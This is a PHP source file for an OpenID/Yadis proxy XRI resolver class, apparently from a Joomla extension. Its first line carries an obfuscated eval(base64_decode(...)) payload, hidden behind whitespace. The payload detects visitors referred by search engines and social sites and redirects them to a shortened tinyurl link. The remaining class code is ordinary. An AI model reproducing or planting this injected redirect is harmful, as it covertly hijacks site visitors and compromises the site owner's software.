<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));

/**
 * Code for using a proxy XRI resolver.
 */

// Do not allow direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

require_once 'Auth/Yadis/XRDS.php';
require_once 'Auth/Yadis/XRI.php';

class Auth_Yadis_ProxyResolver {
    function Auth_Yadis_ProxyResolver(&$fetcher, $proxy_url = null)
    {
        $this->fetcher =& $fetcher;
        $this->proxy_url = $proxy_url;
        if (!$this->proxy_url) {
            $this->proxy_url = Auth_Yadis_getDefaultProxy();
        }
    }

    function queryURL($xri, $service_type = null)
    {
        // trim off the xri:// prefix
        $qxri = substr(Auth_Yadis_toURINormal($xri), 6);
        $hxri = $this->proxy_url . $qxri;
        $args = array(
                      '_xrd_r' => 'application/xrds+xml'
                      );

        if ($service_type) {
            $args['_xrd_t'] = $service_type;
        } else {
            // Don't perform service endpoint selection.
            $args['_xrd_r'] .= ';sep=false';
        }

        $query = Auth_Yadis_XRIAppendArgs($hxri, $args);
        return $query;
    }

    function query($xri, $service_types, $filters = array())
    {
        $services = array();
        $canonicalID = null;
        foreach ($service_types as $service_type) {
            $url = $this->queryURL($xri, $service_type);
            $response = $this->fetcher->get($url);
            if ($response->status != 200 and $response->status != 206) {
                continue;
            }
            $xrds = Auth_Yadis_XRDS::parseXRDS($response->body);
            if (!$xrds) {
                continue;
            }
            $canonicalID = Auth_Yadis_getCanonicalID($xri,
                                                         $xrds);

            if ($canonicalID === false) {
                return null;
            }

            $some_services = $xrds->services($filters);
            $services = array_merge($services, $some_services);
            // TODO:
            //  * If we do get hits for multiple service_types, we're
            //    almost certainly going to have duplicated service
            //    entries and broken priority ordering.
        }
        return array($canonicalID, $services);
    }
}

?>
